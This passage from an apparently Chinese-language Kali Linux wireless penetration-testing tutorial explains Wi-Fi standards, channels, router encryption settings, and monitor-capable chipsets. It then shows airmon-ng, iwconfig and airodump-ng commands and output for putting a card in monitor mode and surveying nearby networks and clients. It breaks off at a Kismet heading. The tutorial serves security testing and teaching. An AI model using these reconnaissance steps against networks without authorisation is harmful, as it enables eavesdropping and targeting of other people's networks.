id="2-2-802-11ac协议"><a href="#2-2-802-11ac协议" class="headerlink" title="2.2 802.11ac协议"></a>2.2 802.11ac协议</h3><p>802.11ac是802.11n的继承者。它是在802.11a标准上建立起来的，包括使用802.11ac的5GHz频段。802.11ac每个通道的工作频宽将由802.11n的40MHz提升到80MHz，甚至160MHz，再加上大约10%的实际频率调制效率提升，最终理论传输速度将由802.11n最高的600Mbps跃升至1Gbps。实际传输率可以在300Mbps~400Mbps之间，接近目前802.11n实际传输率的3倍（目前802.11n无线路由器的实际传输率在75Mbps~150Mbps之间），足以在一条信道上同时传输多路压缩视频流。</p><h3 id="2-3-2-4GHz频段"><a href="#2-3-2-4GHz频段" class="headerlink" title="2.3 2.4GHz频段"></a>2.3 2.4GHz频段</h3><p>频段指的是无线信号的频率范围。无线信号在规定的频率范围传输数据。2.4GHz频段的频率范围是2.4~2.4835GHz。为了充分利用这个频段，将该范围分为几个部分，每个部分称为一个信道。目前主流的WiFi网络一般都支持13个信道。它们的中心频率虽然不同，但是，因为都占据一定的频率范围，所以会有一些互相重叠的情况。13个信道的频率范围如下表所示。</p><table><thead><tr><th>信道</th><th>中心频率</th><th>信道</th><th>中心频率</th></tr></thead><tbody><tr><td>1</td><td>2412MHz</td><td>8</td><td>2447MHz</td></tr><tr><td>2</td><td>2417MHz</td><td>9</td><td>2452MHz</td></tr><tr><td>3</td><td>2422MHz</td><td>10</td><td>2457MHz</td></tr><tr><td>4</td><td>2427MHz</td><td>11</td><td>2462MHz</td></tr><tr><td>5</td><td>2432MHz</td><td>12</td><td>2467MHz</td></tr><tr><td>6</td><td>2437MHz</td><td>13</td><td>2472MHz</td></tr><tr><td>7</td><td>2442MHz</td><td></td><td></td></tr></tbody></table><p>通过了解这13个信道所处的频段，有助于理解人们常说的3个不互相重叠的信道的含义。无线网络可在多个信道上运行。在无线信号覆盖范围内的各种无线网络设备应该尽量使用不同的信道，以避免信号之间的干扰。上表中是常用的2.4GHz（=2400MHz）频带的信道划分，实际一共有14个信道，但第14个信道一般不使用。每个信道的有效宽度是20MHz，另外还有2MHz的强制隔离频带。也就是说，对于中心频率为2412MHz的1信道，其频率范围为2401~2432MHz。具体14个信道的划分如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%873.png" alt="图片3"></p><p>从该图中可以看到，其中1、6、11这3个信道（实线标记）之间是完全没有重叠的，也就是人们常说的3个不互相重叠的信道。在图中也很容易看清楚其他各信道之间频段重叠的情况。另外，如果设备支持，除1、6、11这3个一组互不干扰的信道外，还有（2，7，12）、（3，8，13）和（4，9，14）3组互不干扰的信道。</p><h3 id="2-4-5GHz频段"><a href="#2-4-5GHz频段" class="headerlink" title="2.4 5GHz频段"></a>2.4 5GHz频段</h3><p>随着时代的发展，5GHz频段逐渐走进了人们的生活。5GHz是新的无线协议。5GHz频段由于频率高，波长相对于2.4GHz要短，因此穿透性和距离性偏弱，但数据传输更快。<br>5GHz支持的信道有5个，分别是149、153、157、161和165。当周围5GHz信号源较少时，可以任意选择信道。5GHz频段中信道的中心频率，如下表所示。</p><table><thead><tr><th>信道</th><th>中心频率</th></tr></thead><tbody><tr><td>149</td><td>5745</td></tr><tr><td>153</td><td>5765</td></tr><tr><td>157</td><td>5785</td></tr><tr><td>161</td><td>5805</td></tr><tr><td>165</td><td>5825</td></tr></tbody></table><h3 id="2-5-带宽"><a href="#2-5-带宽" class="headerlink" title="2.5 带宽"></a>2.5 带宽</h3><p>这里的带宽指的是信道带宽。信道带宽也常被称为“频段带宽”，是调制载波占据的频率范围，也是发送无线信号频率的标准。在常用的2.4~2.4835GHz频段上，每个信道的带宽为20MHz。在2.1表中可以发现，802.11 n协议包括两个带宽，分别是20MHz和40MHz。<br>其中，20MHz在802.11 n模式下能达到144Mbps带宽，它穿透性好，传输距离远（约100米左右）；40MHz在802.11模式下能达到300Mbps带宽，但穿透性稍差，传输距离近（约50米左右）。如果读者对以上的解释不是很清楚，可以将这两个带宽想象成道路的宽度。所以，宽度越宽同时能跑的数据越多，也就提高了速度。但是，无线网的“道路”是大家共享的。当一个用户占用的道路过宽，跑的数据多时，就容易跟其他人碰撞。一旦撞车，全部人的速度都会慢下来，可能比在窄路上走还要慢。<br>为了帮助用户更清楚地理解信道带宽，下面通过一个图来进行分析，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%874.png" alt="图片4"></p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%875.png" alt="图片5"></p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p>从图中可以看到，802.11b/g协议允许4个AP同时使用。如果其中一个AP用了40MHz，就只能两个AP同时使用。所以，选择哪个带宽主要是看附近有多少AP在同时工作。如果附近没太多的干扰，那么建议选择使用40MHz带宽，可以获得较高的传输速度。如果AP较多，则建议使用20MHz带宽。</p><h2 id="三、无线网络安全保障"><a href="#三、无线网络安全保障" class="headerlink" title="三、无线网络安全保障"></a>三、无线网络安全保障</h2><p>无线网络安全保障是用来保护无线网络安全的相关设置。在大部分路由器中，支持3种无线加密方式，分别是WEP、WPS和WPA/WPA2。而且，为了方便连接到无线网络，用户也可以不使用加密。</p><h3 id="3-1-无密码模式"><a href="#3-1-无密码模式" class="headerlink" title="3.1 无密码模式"></a>3.1 无密码模式</h3><p>无密码模式就是不使用密码，无须密码即可快速连接到无线网络。但是，这种模式没有安全性。下面将以TP-LINK路由器为例，介绍无线网络的每种加密模式。</p><p>设置无密码模式。具体操作步骤如下：</p><ol><li><p>登录路由器的管理界面。一般情况下，路由器默认的地址为192.168.1.1或192.168.0.1。本例中的路由器地址为192.168.0.1。所以，在浏览器中输入地址<code>http://192.168.0.1</code>，将弹出一个密码登录对话框，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%877.png" alt="图片7"></p></li><li><p>在该对话框中输入登录的用户名和密码，然后，单击“登录”按钮，将显示路由器的主界面，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%878.png" alt="图片8"></p></li><li><p>在左侧栏中依次选择“无线设置”|“无线安全设置”选项，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%879.png" alt="图片9"></p></li><li><p>从该界面可以看到支持的所有加密方式，包括WPA-PSK/WPA2-PSK、WPA/WPA2和WEP。这里设置无密码模式。所以，选择“不开启无线安全”单选按钮。然后，单击底部的“保存”按钮，将弹出一个提示对话框，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>这里提示用户需要重新启动路由器后，才可以使设置生效。单击“确定”按钮，在界面的底部将显示一个重新启动路由器提示信息，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8711.png" alt="图片11"></p></li><li><p>从该界面可以看到，提示用户已经更改了无线设置，重启后生效。此时，单击“重启”选项，将弹出重新启动路由器的界面，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8712.png" alt="图片12"></p></li><li><p>单击“重启路由器”按钮，将重新启动路由器。启动后，则设置生效。此时，用户无须输入密码就能快速连接到无线网络。</p></li></ol><h3 id="3-2-WEP模式"><a href="#3-2-WEP模式" class="headerlink" title="3.2 WEP模式"></a>3.2 WEP模式</h3><p>WEP（Wired Equivalent Privacy，有线等效保密协议），WEP协议可以对两台设备间无线传输的数据进行加密，以防止非法用户窃听或侵入无线网络。但是，该协议中存在一些缺点，所以很容易被攻击。目前，很少人使用这种加密方式了。</p><p>下面仍然以TP-LINK路由器为例，设置WEP加密模式。具体操作步骤如下：</p><ol><li><p>登录路由器的管理界面。然后，在左侧栏中依次选择“无线设置”|“无线安全设置”选项，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8713.png" alt="图片13"></p></li><li><p>在该界面中选择WEP单选按钮，即WEP加密模式，然后，用户可以设置该加密方式的认证类型、密钥格式和WEP密钥。其中，认证类型包括自动、开放系统和共享密钥；密钥格式包括ASCII码和十六进制。当用户选择开放系统时，无线网络内的主机可以在不提供认证密码的前提下，通过认证并关联无线网络。但是，如果要进行数据传输，必须提供正确的密码。当用户选择共享密钥时，无线网络内的主机必须提供正确的密码才能通过认证；否则，无法关联无线网络，也无法进行数据传输。如果用户不想要进行设置，可以选择自动选项。对于WEP密钥格式，用户可以根据自己的喜好选择。设置完成后，单击“保存”按钮，将弹出提示对话框，如下图所示。</p><p>​ <img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8714.png" alt="图片14"></p></li><li><p>单击“重启”按钮，将显示重新启动路由器的界面，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8715.png" alt="图片15"></p></li><li><p>单击“重启路由器”按钮，将重新启动路由器。路由器重新启动后，用户就可以通过WEP加密方式来连接无线网络了。</p></li></ol><h3 id="3-3-WPA-WPA2模式"><a href="#3-3-WPA-WPA2模式" class="headerlink" title="3.3 WPA/WPA2模式"></a>3.3 WPA/WPA2模式</h3><p>WPA（Wi-Fi Protected Access），有WPA和WPA2两个标准，是一种保护无线计算机网络安全的系统。由于WEP协议中存在非常严重的弱点，所以WPA/WPA2是为取代WEP而产生的。尽管这种加密方式非常安全，但是用户通过捕获握手包，还是可以暴力破解其密码。下面介绍WPA/WPA2模式的设置方法。</p><p>设置WPA/WPA2加密模式。具体操作步骤如下：</p><ol><li><p>登录路由器，并打开无线安全设置界面，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8716.png" alt="图片16"></p></li><li><p>在该界面中可以看到，提供了两种WPA/WPA2的加密模式。其中，WPA-PSK/WPA2-PSK是针对小型企业或家用网络的；WPA/WPA2模式一般用于大型企业。所以，这里选择WPA-PSK/WPA2-PSK模式。然后，设置认证类型、加密算法和PSK密码。其中，认证类型包括自动、WPA-PSK和WPA2-PSK；加密算法包括自动、TKIP（新的802.11n不支持此加密算法）和AES。这里都选择为“自动”选项，然后单击“保存”按钮。接下来，根据提示重新启动路由器使设置生效。</p></li></ol><h3 id="3-4-WPS模式"><a href="#3-4-WPS模式" class="headerlink" title="3.4 WPS模式"></a>3.4 WPS模式</h3><p>WPS（Wi-Fi Protected Setup，WiFi保护设置），WPS是由WiFi联盟组织实施的可选认证项目，主要是为了简化无线网络设置及无线网络加密等工作。一般情况下，用户在新建一个无线网络时，为了保证无线网络的安全，都会对无线网络名称（SSID）和无线加密方式进行设置。当这些设置完成后，客户端连接此无线网络时，必须输入网络名称及冗长的无线加密密码。为了方便输入，通过WPS模式即可快速连接到无线网络。下面将介绍WPS模式的设置方法。提示：在路由器中，一些路由器的按钮显示为WPS，还有一些路由器的按钮显示为QSS。</p><p>在TP-LINK路由器中启用WPS模式。具体操作步骤如下：</p><ol><li><p>登录路由器，并选择QSS安全设置选项，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8717.png" alt="图片17"></p></li><li><p>从该界面可以看到QSS功能状态已关闭，即没有启用WPS功能。此处，单击“启用QSS”按钮，即可启动WPS功能。单击“启用QSS”按钮后，将显示重新启动路由器的提示对话框，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8718.png" alt="图片18"></p></li><li><p>单击“确定”按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8719.png" alt="图片19"></p></li><li><p>单击“重启”按钮，将显示重启路由器的对话框，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8720.png" alt="图片20"></p></li><li><p>单击“重启路由器”按钮，即可重新启动路由器。重新启动路由器后，可看到WPS功能已启用，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8721.png" alt="图片21"></p></li><li><p>从该界面可以看到QSS功能已启用。由此可以说明，WPS模式已成功启动。接下来，用户通过按WPS/QSS键，可快速连接到无线网络。</p></li></ol><h2 id="四、无线网络监听"><a href="#四、无线网络监听" class="headerlink" title="四、无线网络监听"></a>四、无线网络监听</h2><p>由于无线网络中的数据包是以无线信号的方式传播的，所以用户可以对该网络中的数据包进行监听，以捕获到所有的数据。如果要对无线网络监听，必须将无线网卡设置为监听模式。</p><h3 id="4-1-网卡的工作模式"><a href="#4-1-网卡的工作模式" class="headerlink" title="4.1 网卡的工作模式"></a>4.1 网卡的工作模式</h3><p>无线网卡可以工作在多种模式下，以实现不同的功能。其中，主要模式有被管理模式（Managed mode）、Ad hoc模式、主模式（Master mode）和监听模式（Monitor mode）。其中，这4种工作模式的概念如下所述。</p><ul><li><p><strong>被管理模式</strong>（Managed mode）：当用户的无线客户端直接与无线接入点（Wireless Access Point，WAP）连接时，使用这个模式。在这个模式中，无线网卡的驱动程序依赖WAP管理整个通信过程。该模式的工作原理，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8722.png" alt="图片22"></p></li><li><p><strong>Ad hoc模式：点对点模式</strong>。当用户的网络由互相直连的设备组成时，使用这个模式。在这个模式中，无线通信双方共同承担WAP的职责。该模式的工作原理，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8723.png" alt="图片23"></p></li><li><p><strong>主模式</strong>（Master mode）：一些高端无线网卡支持主模式。这个模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的AP。该模式的工作原理，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8724.png" alt="图片24"></p></li><li><p><strong>监听模式</strong>（Monitor mode）：从用途角度来说，这是最重要的模式。如果客户端不用于收发数据，只用于监听网络中所有的数据包时，使用监听模式。该模式的工作原理，如下图所示。</p><p><img src="/2021/01/07/kali-wu-xian-wang-luo-shen-tou/%E5%9B%BE%E7%89%8725.png" alt="图片25"></p></li></ul><h3 id="4-2-支持监听的无线网卡"><a href="#4-2-支持监听的无线网卡" class="headerlink" title="4.2 支持监听的无线网卡"></a>4.2 支持监听的无线网卡</h3><p>如果要对无线网络进行监听，则使用的无线网卡必须支持监听模式。为了方便用户更好地选择无线网卡，这里将列举Kali Linux中支持监听的网卡芯片，如下表所示。</p><table><thead><tr><th>芯片</th><th>Windows驱动（监听模式）</th><th>Linux驱动</th></tr></thead><tbody><tr><td>Atheros</td><td>V4.2、v3.0.1.12、AR5000</td><td>Madwifi、ath5k、ath9k、ath9k_htc、ar9170/carl9170</td></tr><tr><td>Atheros</td><td></td><td>ath6kl</td></tr><tr><td>Atmel</td><td></td><td>Atmel AT76c503a</td></tr><tr><td>Atmcl</td><td></td><td>Atmcl AT76 USB</td></tr><tr><td>Broadcom</td><td>Broadcom peek driver</td><td>bcm43xx</td></tr><tr><td>Broadcom with b43 dirver</td><td></td><td>b43</td></tr><tr><td>Broadcom 802.11n</td><td></td><td>brcm80211</td></tr><tr><td>Ccntrino b</td><td></td><td>ipw2100</td></tr><tr><td>Ccntrino b/g</td><td></td><td>ipw2200</td></tr><tr><td>Ccntrino a/b/g</td><td></td><td>ipw2915、ipw3945、iwl3945</td></tr><tr><td>Ccntrino a/g/n</td><td></td><td>iwlwifi</td></tr><tr><td>Cisco/Aironel</td><td>Cisco PCX500/PCX504 peek driver</td><td>airo-linux</td></tr><tr><td>Hermes I</td><td>Agere peek driver</td><td>Orinoco、Orinoco Monitor Modc Patch</td></tr><tr><td>Ndiswrappcr</td><td>N/A</td><td>ndiswrappcr</td></tr><tr><td>cx3110x（Nokia 770/800）</td><td></td><td>cx3110x</td></tr><tr><td>prism2/2.5</td><td>LinkFerret or aerosol</td><td>HostAP、wlan-ng</td></tr><tr><td>prismGT</td><td>PrismGT by 500 brabus</td><td>prism54</td></tr><tr><td>prismGT（altcrnativc）</td><td></td><td>p54</td></tr><tr><td>Ralink</td><td></td><td>rt2x00、RaLink RT2570USB Enhanccd Drivcr、RaLink RT73 USB Enhanced Driver</td></tr><tr><td>Ralink RT2870/3070</td><td></td><td>rt2800usb</td></tr><tr><td>Realtek 8180</td><td>Realtek peek driver</td><td>rtl8180-sa2400</td></tr><tr><td>Realtek 8187L</td><td></td><td>r8187rtl8187</td></tr><tr><td>Realtek 8187B</td><td></td><td>rtl8187（2.6.27+）、r8187b（beta）</td></tr><tr><td>TI</td><td></td><td>ACX100/ACX111/ACX100USB</td></tr><tr><td>ZyDAS 1201</td><td></td><td>zd1201</td></tr><tr><td>ZyDAS 1211</td><td></td><td>zd1211rw plus patch</td></tr><tr><td>RTL8812AU</td><td></td><td></td></tr><tr><td>RT3572</td><td></td><td>rt2800usb</td></tr></tbody></table><p>以上列举了许多个无线网卡。对于2.4GHz WiFi网络，建议用户选择芯片为3070或8187的无线网卡。对于5GHz WiFi网络，只支持芯片为RT3572和RTL8812AU的无线网卡。</p><h3 id="4-3-设置监听模式"><a href="#4-3-设置监听模式" class="headerlink" title="4.3 设置监听模式"></a>4.3 设置监听模式</h3><p>当用户选择合适的无线网卡后，即可设置该无线网卡为监听模式。一般情况下，用户使用airmon-ng命令设置无线网卡为监听模式。语法格式如下：</p><blockquote><p>airmon-ng start &lt;interface&gt;</p></blockquote><p>以上语法中，参数start，表示启动监听模式；interface是指无线网络接口。</p><p>设置无线网卡为监听模式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">Kill them using <span class="string">'airmon-ng check kill'</span> before putting</span><br><span class="line">the card <span class="keyword">in</span> monitor mode, they will interfere by changing channels</span><br><span class="line">and sometimes putting the interface back <span class="keyword">in</span> managed mode</span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">    579 NetworkManager</span><br><span class="line">   1281 wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHYInterfaceDriverChipset</span><br><span class="line"></span><br><span class="line">phy6wlan0rt2800usbRalink Technology, Corp. RT5572</span><br><span class="line">(mac80211 monitor mode already enabled <span class="keyword">for</span> [phy6]wlan0 on [phy6]wlan0)</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功启动了监听模式，其监听接口为wlan0。</p><h3 id="4-4-设置5G-WiFi网卡的监听模式"><a href="#4-4-设置5G-WiFi网卡的监听模式" class="headerlink" title="4.4 设置5G WiFi网卡的监听模式"></a>4.4 设置5G WiFi网卡的监听模式</h3><p>目前，支持5G WiFi的常见网卡芯片有两种，分别是RT3572和RTL8812AU。其中，RT3572芯片的无线网卡和普通的无线网卡设置相同，直接使用airmon-ng命令即可启动监听模式。但是RTL8812AU芯片的无线网卡还需要安装驱动，而且需手动设置监听模式。下面介绍设置RTL8812AU芯片的无线网卡为监听模式的方法。</p><p>设置RTL8812AU芯片的无线网卡为监听模式。具体操作步骤如下：</p><ol><li><p>安装驱动。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get install realtek-rtl88xxau-dkms</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，如果没有报错，则说明驱动安装成功。</p></li><li><p>查看无线网卡的模式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iwconfig </span></span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=18 dBm</span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:off</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  Mode:Managed  Frequency:2.412 GHz  Tx-Power=20 dBm</span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，该无线网卡当前的工作模式为<strong>Managed</strong>（管理模式）。</p></li><li><p>停止无线网卡接口。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip link set wlan0 down</span></span><br></pre></td></tr></table></figure></li><li><p>设置无线网卡为监听模式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iwconfig wlan0 mode monitor</span></span><br></pre></td></tr></table></figure></li><li><p>启动无线网卡。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip link set wlan0 up</span></span><br></pre></td></tr></table></figure></li><li><p>再次查看无线网卡的模式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iwconfig</span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm</span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">       Power Management:off</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，已成功将芯片设置为Monitor（监听模式）。其中，监听模式的接口名为wlan0。</p></li></ol><h2 id="五、扫描无线网络"><a href="#五、扫描无线网络" class="headerlink" title="五、扫描无线网络"></a>五、扫描无线网络</h2><p>扫描无线网络，就是扫描周围的无线网络信号，以找出渗透测试的目标。如果用户要实施渗透测试，则需要知道目标无线网络的一些基本信息，如AP名称、MAC地址和工作的信道等。通过对无线网络实施扫描，并分析扫描结果，以选择对应的工具实施渗透测试。</p><h3 id="5-1-使用Airodump-ng工具"><a href="#5-1-使用Airodump-ng工具" class="headerlink" title="5.1 使用Airodump-ng工具"></a>5.1 使用Airodump-ng工具</h3><p>Airodump-ng是Aircrack-ng工具集中的一个工具，可以用来扫描周围的无线网络信号。通过分析捕获到的无线信号数据包，可知周围开放的AP名称、MAC地址、信道及加密方式。下面将介绍使用Airodump-ng工具扫描无线网络的方法。<br>使用Airodump-ng工具扫描无线网络的语法格式如下：</p><blockquote><p>airodump-ng &lt;interface&gt;</p></blockquote><p>以上语法中，参数interface表示无线网卡监听接口。</p><p>使用Airodump-ng工具扫描无线网络。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># airodump-ng wlan0</span></span><br><span class="line"> </span><br><span class="line"> CH  1 ][ Elapsed: 6 mins ][ 2021-01-13 14:27</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span></span><br><span class="line"></span><br><span class="line"> 70:57:BF:93:45:F3   -1        0       19    0   6   -1   WPA              &lt;length:  0&gt;</span><br><span class="line"> 06:05:88:E1:E4:36  -67        0       10    0   1   -1   WPA              &lt;length:  0&gt;</span><br><span class="line"> 06:05:88:E1:EF:7E   -1        0        3    0   6   -1   WPA              &lt;length:  0&gt;</span><br><span class="line"> 70:57:BF:93:44:F7   -1        0        3    0   1   -1   WPA              &lt;length:  0&gt;</span><br><span class="line"> 06:05:88:E1:E5:CA  116        0        4    0   6   -1   WPA              &lt;length:  0&gt;</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line"> 70:57:BF:93:45:F3  58:00:E3:BA:3A:6B  117    0 - 0e     0       12</span><br><span class="line"> 70:57:BF:93:45:F3  A4:83:E7:5F:35:B9  117    0 -24      0        1</span><br><span class="line"> 70:57:BF:93:45:F3  98:5A:EB:89:DF:EC  117    0 -24e     0        7</span><br><span class="line"> 06:05:88:E1:E4:36  64:90:C1:3E:18:DE  117   11e- 0e     0        4</span><br><span class="line"> 06:05:88:E1:EF:7E  AC:35:EE:1E:94:47  117    0 - 0e     0        3</span><br><span class="line"> 70:57:BF:93:44:F7  DC:08:0F:1F:B1:13  117    0 -24      0        1</span><br><span class="line"> 70:57:BF:93:44:F7  E4:70:B8:32:B5:8B  117    0 -48e     0        3</span><br><span class="line"> 06:05:88:E1:E5:CA  00:F4:8D:FB:CA:BF  117    0e- 0e     0        2</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到扫描到的无线网络信息。在以上输出信息中包括很多列，每列参数的含义如下：</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>BSSID</td><td>表示无线AP的MAC地址。</td></tr><tr><td>PWR</td><td>网卡报告的信号水平，它主要取决于驱动。当信号值越高时，说明离AP或计算机越近。如果BSSID和PWR两列的值都是-1，说明网卡的驱动不支持报告信号水平。如果PWR值为-1，那么说明该客户端不在当前网卡能监听到的范围内，但是能捕获到AP发往客户端的数据。如果所有的客户端PWR值都为-1，那么说明网卡驱动不支持信号水平报告。</td></tr><tr><td>Beacons</td><td>无线AP发出的通告编号。每个接入点（AP）在最低速率（1M）时每秒大约发送10个beacon。</td></tr><tr><td>#Data</td><td>被捕获到的数据分组的数量（如果是WEP，则代表唯一IV的数量），包括广播分组。</td></tr><tr><td>#/s</td><td>过去10秒钟内，每秒捕获数据分组的数量。</td></tr><tr><td>CH</td><td>信道号（从Beacons中获取）。</td></tr><tr><td>MB</td><td>无线AP所支持的最大速率。如果值为11，表示使用的是802.11b协议；如果值为22，表示使用的是802.11b+协议；如果更高，表示使用的是802.11g协议。如果值中包含点号（高于54之后），则表明支持短前导码。如果值中包含’e’，表示网络中有QoS（802.11 e）启用。</td></tr><tr><td>ENC</td><td>使用的加密算法体系。OPN表示无加密。WEP?表示WEP或者WPA/WPA2，WEP（没有问号）表明静态或动态WEP。</td></tr><tr><td>CIPHER</td><td>检测到的加密算法，为CCMP、WRAAP、TKIP、WEP和WEP104中的一个。典型地来说（但不一定），TKIP与WPA结合使用，CCMP与WPA2结合使用。如果密钥索引值大于0，显示为WEP40。标准情况下，索引0~3是40bit，104bit应该是0。</td></tr><tr><td>AUTH</td><td>使用的认证协议。常用的有MGT（WPA/WPA2使用独立的认证服务器，如我们常说的802.1x，radius和eap等），SKA（WEP的共享密钥），PSK（WPA/WPA2的预共享密钥）或者OPN（WEP开放式）。</td></tr><tr><td>ESSID</td><td>也就是所谓的SSID号。如果启用隐藏的SSID，它可以为空，或者显示为&lt;length:0&gt;。这种情况下，airodump-ng试图从proberesponses和associationrequests中获取SSID。</td></tr><tr><td>STATION</td><td>客户端的MAC地址，包括已连接的和想要搜索无线网络来连接的客户端。如果客户端没有连接上，就在BSSID下显示not associated。</td></tr><tr><td>Rate</td><td>表示传输率。</td></tr><tr><td>Lost</td><td>在过去10秒钟内丢失的数据分组，基于序列号检测。它意味着从客户端发送来的数据丢包，每个非管理帧中都有一个序列号字段，将刚接收到的那个帧中的序列号和前一个帧中的序列号相减，就可以知道丢了几个包。</td></tr><tr><td>Frames</td><td>客户端发送的数据分组数量。</td></tr><tr><td>Probe</td><td>被客户端查探的ESSID。如果客户端正试图连接一个AP，但是没有连接上，就会显示在这里。</td></tr></tbody></table><h3 id="5-2-使用Kismet工具"><a href="#5-2-使用Kismet工具" class="headerlink" title="5.2 